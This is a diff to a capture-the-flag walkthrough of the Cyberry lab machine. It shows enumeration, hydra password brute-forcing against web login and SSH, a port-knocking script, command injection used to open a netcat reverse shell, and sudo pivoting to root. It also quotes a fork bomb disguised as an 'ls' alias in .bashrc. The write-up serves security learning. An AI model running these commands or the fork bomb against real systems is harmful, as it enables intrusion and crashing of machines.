@@ -40,11 +40,11 @@ PORT    STATE  SERVICE REASON         VERSION
 666/tcp closed doom    reset ttl 64
 ```
 
-Let's start with the web service first.
+`nmap` finds three open ports — `21/tcp`, `22/tcp`, and `80/tcp`. I don't know what `666/tcp` is for — gateway to Hell? Good thing it's closed then. Among the three open ports, `80/tcp`, commonly known as web service, is the easiest to explore because the protocol (`http`) is well-documented and is in plain text. Let's start with it first.
 
 ### Directory/File Enumeration
 
-Let's enumerate the common directories and files with `gobuster`.
+Let's identify the common directories and files with `gobuster` and `common.txt` from [SecLists](https://github.com/danielmiessler/SecLists).
 
 ```
 Gobuster v1.1 OJ Reeves (@TheColonial)
@@ -65,21 +65,23 @@ http://192.168.198.128/phpmyadmin (Status: 301)
 =====================================================
 ```
 
+Everything looks normal execpt for `.bashrc`.
+
 ### Fork Bomb :bomb:
 
-There was something sinister lurking in `.bashrc`  
+ Something sinister is lurking in `.bashrc`.
 
 `alias ls='echo "Cyberry Intrusion Detection activated\nsystem failsafe mode will begin in:"; sleep 1; echo "5"; sleep 1; echo "4"; sleep 1; echo "3"; sleep 1; echo "2"; sleep 1; echo "1"; sleep 1; :(){ :|: & };:`
 
-A fork bomb!
+A fork bomb! A fork bomb replicates itself until it depletes system resources, causing your system to "hang". In this case, using `ls` will set off the fork bomb.
 
 ### HTML Comments
 
-There were a couple of HTML comments in the source code encoded in `base64`.
+Another popular place to look for clues is in the HTML source code. Here, I look at the source code and find a couple of HTML comments that look like `base64`.
 
 ![comments.png](/assets/images/posts/cyberry-walkthrough/cyberry-1.png)
 
-Decoding the above strings revealed the following.
+Let's decode them.
 
 ```
 # curl -s 192.168.198.128 | sed -n '/<!--/,/-->/p' | tr -cd 'a-zA-Z0-9=\n' > base64.txt
@@ -93,7 +95,7 @@ secretfile.html
 work-in-progress.png
 ```
 
-Requesting for `/secretfile.html` further revealed more binary strings.
+A request for `/secretfile.html` reveals more binary strings.
 
 ```
 curl -i 192.168.198.128/secretfile.html
@@ -122,7 +124,7 @@ Content-Type: text/html
 </html>
 ```
 
-The binary strings decodes to the following.
+The binary strings decode to the following.
 
 ```
 for b in 01100010 01101111 01110011 01110011 00101110 01100111 01101001 01100110; do printf "%02x" $((2#$b)); done | xxd -p -r && echo
@@ -132,7 +134,7 @@ boss.gif
 
 ![boss.gif](/assets/images/posts/cyberry-walkthrough/boss.gif)
 
-Requesting for `/work-in-progress.png` resulted in the following.
+A request for `/work-in-progress.png` results in the following.
 
 ```
 # curl -i 192.168.198.128/work-in-progress.png
@@ -148,21 +150,21 @@ Content-Type: image/png
 edocrq
 ```
 
-_Note that the reverse of "edocrq" is "qrcode"._
+Notice that the reverse of "edocrq" is "qrcode"?
 
-Well, in any case, the file `edocrq` was available from the web server and it looked like this.
+The file `edocrq` is available from the web server and it looks like this.
 
 ![edocrq.png](/assets/images/posts/cyberry-walkthrough/edocrq.png)
 
-There's a slight twist before I decode the QR code. It needs to flip it horizontally like so.
+Flip it horizontally to decode, as in the reverse of "edocrq" to "qrcode"
 
 ![qrcode.png](/assets/images/posts/cyberry-walkthrough/qrcode.png)
 
-It's decoded to `/berrypedia.html`.
+It decodes to `/berrypedia.html`.
 
 ### Directory/File Enumeration (2)
 
-`dirbuster` got to the same conclusion without going through the hard way.
+`dirbuster` reaches the same conclusion without going through the hard way.
 
 ```
 Starting OWASP DirBuster 1.0-RC1
@@ -195,9 +197,9 @@ DirBuster Stopped
 
 ### Login Page
 
-The login page had a weakness - it leaked information about the existence of a user.
+The login page has a weakness — it leaks information about the existence of a user.
 
-_If the user does not exist_
+_If the user doesn't exists_
 
 ![non-exist.png](/assets/images/posts/cyberry-walkthrough/cyberry-5.png)
 
@@ -205,7 +207,7 @@ _If the user exists and the password is invalid_
 
 ![exist.png](/assets/images/posts/cyberry-walkthrough/cyberry-6.png)
 
-With this in mind, I was able to perform online password cracking with `hydra`.
+With this in mind, let's do a online password cracking with `hydra`.
 
 ```
 # hydra -l root -P /usr/share/wordlists/rockyou.txt -f -e sr 192.168.198.128 http-post-form "/login.php:username=^USER^&password=^PASS^:not valid"
@@ -214,29 +216,29 @@ With this in mind, I was able to perform online password cracking with `hydra`.
 
 ### Berrypedia Admin Panel
 
-Too bad this is not the SSH password for `root`. I was able to login to the admin panel but there was nothing interesting to see.
+Too bad this is not the SSH password for `root`. I was able to login to the admin panel but there is nothing interesting to see.
 
 ![panel.png](/assets/images/posts/cyberry-walkthrough/cyberry-7.png)
 
 ### phpMyAdmin 4.6.6
 
-PMA was present as well, which is another way of saying the machine is capable of running PHP.
+PMA is present as well, which is another way of saying the machine runs PHP.
 
 ![pma.png](/assets/images/posts/cyberry-walkthrough/cyberry-2_2.png)
 
 ### Berrypedia
 
-Requesting for `/berrypedia.html` revealed the following page.
+A request for `/berrypedia.html` reveals the following page.
 
 ![berrypedia.png](/assets/images/posts/cyberry-walkthrough/cyberry-8.png)
 
-Elderberry was a hyperlink to an interesting file - `/placeho1der.jpg`.
+Elderberry is a hyperlink to an interesting file — `/placeho1der.jpg`.
 
 ![placeho1der.jpg](/assets/images/posts/cyberry-walkthrough/placeho1der.jpg)
 
 ### Solving the Puzzle
 
-The image required some transformation to reveal the puzzle:
+The image requires some transformation to reveal the puzzle:
 
 * Flip vertical
 * Invert colors
@@ -251,15 +253,15 @@ The image required some transformation to reveal the puzzle:
     <li>Fats Domino (1961)</li>
 </ol>
 
-The photo of each person was intentionally flipped to throw you off when you are searching in Google Images.
+The photo of each person is intentionally flipped to throw you off when you search in Google Images.
 
-The common denominator that linked each person was the song "_I Hear You Knocking_". Each of them had covered the song. Combined with Port of Tacoma, it's obvious that we are looking at port knocking here.
+The common denominator that links each person is the song "_I Hear You Knocking_". Each of them had covered the song at some point. Together with Port of Tacoma, it's obvious that we are looking at port-knocking here.
 
-Port knocking required connecting to a sequence of ports in the correct order. The year each person covered the song makes it a good starting point to guess the correct port sequence.
+Port-knocking requires sending network packets with the `SYN` flag set, to a sequence of ports in the correct order. The year each person covered the song makes it a good starting point to guess the correct sequence.
 
 ### Knockin' on Heaven's Door
 
-I wrote this port knocking script using `nmap`.
+To that end, I wrote a port-knocking script using `nmap`.
 
 {% highlight bash linenos %}
 # cat knock.sh
@@ -267,7 +269,7 @@ I wrote this port knocking script using `nmap`.
 
 TARGET=$1
 
-for ports in $(cat sequence.txt); do
+for ports in $(cat permutation.txt); do
     echo "[*] Trying sequence $ports..."
     for p in $(echo $ports | tr ',' ' '); do
         nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
@@ -277,7 +279,7 @@ for ports in $(cat sequence.txt); do
 done
 {% endhighlight %}
 
-`sequence.txt` contained all the unique sequences of 1955, 1955, 1961 and 1970 and Python can generate it like so.
+`permutation.txt` contains all the permutations of 1955, 1955, 1961 and 1970 and I use Python to generate it.
 
 ```
 # python -c 'import itertools; print list(itertools.permutations([1955,1955,1961,1970]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq
@@ -295,7 +297,7 @@ done
 1970,1961,1955,1955
 ```
 
-Upon reaching sequence `1970,1955,1955,1961`, the port `61955/tcp` appeared.
+When the script reaches the sequence `1970,1955,1955,1961`, the port `61955/tcp` appears.
 
 ```
 61955/tcp open   http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
@@ -305,7 +307,7 @@ Upon reaching sequence `1970,1955,1955,1961`, the port `61955/tcp` appeared.
 |_http-title: Coming Soon
 ```
 
-Another similar site appeared to be running at `61955/tcp`.
+Another similar site appears to be running at `61955/tcp`.
 
 ![reloaded.png](/assets/images/posts/cyberry-walkthrough/cyberry-3.png)
 
@@ -332,7 +334,7 @@ http://192.168.198.128:61955/phpmyadmin (Status: 301)
 =====================================================
 ```
 
-Requesting for `http://192.168.198.128:61955/H` revealed something interesting.
+A request for `http://192.168.198.128:61955/H` reveals something interesting.
 
 ```
 # curl 192.168.198.128:61955/H
@@ -360,7 +362,7 @@ Requesting for `http://192.168.198.128:61955/H` revealed something interesting.
 
 ### Brainfuck
 
-Despite its strange looking form, the code above was in the esoteric [Brainfuck][4] language. An online [interpreter][5] deciphered it to the following.
+Despite its strange looking form, the code above is in the esoteric [Brainfuck][4] language. An online [interpreter][5] deciphers it to the following.
 
 ```
 Hello World!
@@ -384,13 +386,13 @@ OK. I have the team members' names and a password but to whom does the password 
 [22][ssh] host: 192.168.198.128 login: mary password: bakeoff
 ```
 
-Too bad `mary` did not have a shell. Let's see what we can discover from FTP instead.
+Too bad `mary` doesn't have a shell. Let's see what we can discover from FTP instead.
 
 ### FTP Access
 
 ![ftp.png](/assets/images/posts/cyberry-walkthrough/cyberry-9.png)
 
-Noticed that `.bash_history` is a directory? This is unusual and worth taking a closer look.
+Notice that `.bash_history` is a directory? This is unusual and worth taking a closer look.
 
 ![.bash_history.png](/assets/images/posts/cyberry-walkthrough/cyberry-10.png)
 
@@ -414,7 +416,7 @@ password
 
 ### Decryption of `.reminder.enc`
 
-It made sense to use the passwords above to decrypt the file but I wouldn't know which cipher. To that end, I wrote this `bash` script to try all available ciphers until something clicks.
+It makes sense to use the passwords above to decrypt the file but I wouldn't know which cipher. To that end, I wrote this `bash` script to try all available ciphers until something clicks.
 
 {% highlight bash linenos %}
 # cat decrypt.sh
@@ -437,11 +439,11 @@ for c in $(cat ciphers.txt); do
 done
 {% endhighlight %}
 
-`ciphers.txt` contained the available ciphers. Running the script revealed the following.
+`ciphers.txt` contain the available ciphers. Running the script reveals the following.
 
 ![decrypted.png](/assets/images/posts/cyberry-walkthrough/cyberry-2.png)
 
-It certainly looked like some sort of password!
+It certainly looks like some sort of password.
 
 ### Login Page (2)
 
@@ -457,7 +459,7 @@ Good. I'm in.
 
 ### Secure Section
 
-In the secure section, there was a page that appeared to be performing `nslookup` and the `host` parameter had two pre-defined values: **google.com** and **yahoo.com** as shown below.
+In the secure section, there's a page that appears to do `nslookup` and the `host` parameter has two defined values: **google.com** and **yahoo.com**.
 
 ![nslookup.png](/assets/images/posts/cyberry-walkthrough/cyberry-13.png)
 
@@ -465,7 +467,7 @@ Let's see if we can exploit the `host` parameter to execute remote commands.
 
 ![remote-command.png](/assets/images/posts/cyberry-walkthrough/cyberry-14.png)
 
-Bingo. Using this way, I was able to run a reverse shell using `nc` back to me.
+Bingo. I can run a reverse shell using `netcat` using this way.
 
 ![nc.png](/assets/images/posts/cyberry-walkthrough/cyberry-15.png)
 
@@ -475,11 +477,11 @@ Awesome.
 
 ### Learning the `root` Dance
 
-During enumeration of this account, I spotted an interesting file at `/var/www/html-secure/ub3r-s3cur3`
+I spot an interesting file at `/var/www/html-secure/ub3r-s3cur3` during enumeration of the `www-data` account.
 
 ![secure.png](/assets/images/posts/cyberry-walkthrough/cyberry-17.png)
 
-It's a list of Latin words. Perhaps this is another password list that I can use to brute force SSH?
+It's a list of Latin words. Perhaps this is another password list that I can use to brute-force SSH?
 
 ```
 hydra -L members.txt -P nb-latin -f ssh://192.168.198.128
@@ -488,15 +490,15 @@ hydra -L members.txt -P nb-latin -f ssh://192.168.198.128
 
 ### Unstacking the `sudo` Russian Doll
 
-I was able to SSH in to `nick`'s account using the credential (`nick:custodio`) and here's where the crazy `sudo` Russian doll fun begins.
+I'm able to SSH in to `nick`'s account using the credential (`nick:custodio`) and here's where the crazy `sudo` Russian doll fun begins.
 
 ![nick.png](/assets/images/posts/cyberry-walkthrough/cyberry-19.png)
 
-It appeared that `/home/nick/invoke.sh` is a script that runs any executable as `terry`.
+It appears that `/home/nick/invoke.sh` is a script that runs any executable as `terry`.
 
 ![invoke.png](/assets/images/posts/cyberry-walkthrough/cyberry-20.png)
 
-Let's try to open a shell as `terry`. But before we do that, recall that a `fork()` bomb was present in `.bashrc`? One of the users may have this as a defense mechanism when `/bin/bash` is their shell. It's better to use good old `/bin/sh` instead. It ain't pretty but it works.
+Let's try to open a shell as `terry`. But before we do that, recall that a `fork()` bomb is present in `.bashrc`? One of the users may have this as a defense mechanism when `/bin/bash` is their shell. It's better to use good old `/bin/sh` instead. It isn't pretty but it works.
 
 ![terry.png](/assets/images/posts/cyberry-walkthrough/cyberry-21.png)
 
@@ -523,11 +525,11 @@ The buck stops here.
 
 ![stop.png](/assets/images/posts/cyberry-walkthrough/cyberry-26.png)
 
-At the home directory of `chuck` there was still something interesting to look out for.
+At the home directory of `chuck` there is still something interesting to look out for.
 
 ![deleted.png](/assets/images/posts/cyberry-walkthrough/cyberry-27.png)
 
-The file at `/home/chuck/.deleted/deleted` provided hints to the `root` password!
+The file at `/home/chuck/.deleted/deleted` provides hints to the `root` password.
 
 ### Guessing the `root` Password
 
@@ -536,13 +538,13 @@ Here's what we know about the `root` password.
 ```
 The password starts with "che" and ends with "rry"
 
-letter e appears three times
-letter c appears twice
-letter r appears twice
-letter b appears twice
-letter a appears twice
+letter "e" appears three times
+letter "c" appears twice
+letter "r" appears twice
+letter "b" appears twice
+letter "a" appears twice
 
-The other letters in the password were h,w,m & y
+The other letters in the password are "h", "w", "m", and "y"
 
 It's a concatenated 4-word password
 
@@ -558,7 +560,7 @@ The first word must contain the following:
 * one "m"; or
 * one "w"
 
-I used the following command to find the first word by eliminating the characters that should not appear and it must be a word in a dictionary.
+I use the following command to find the first word by eliminating the characters that should not appear and it's a word in a dictionary.
 
 ```
 # for word in $(grep -E '^che' /usr/share/dict/words | tr -cd 'chebmw\n' | sort | uniq | tr '\n' ' '); do grep -Eo "^$word$" /usr/share/dict/words; done
@@ -591,7 +593,8 @@ chewmebacaberry
 chewbacabemerry
 chewbebacamerry
 ```
-One of the above got to be the `root` password. Using `hydra`, verifying the password is simple.
+
+One of the above has to be the `root` password. Using `hydra`, verifying the password is simple.
 
 ```
 # hydra -l root -P passwords.txt -f ssh://192.168.198.128
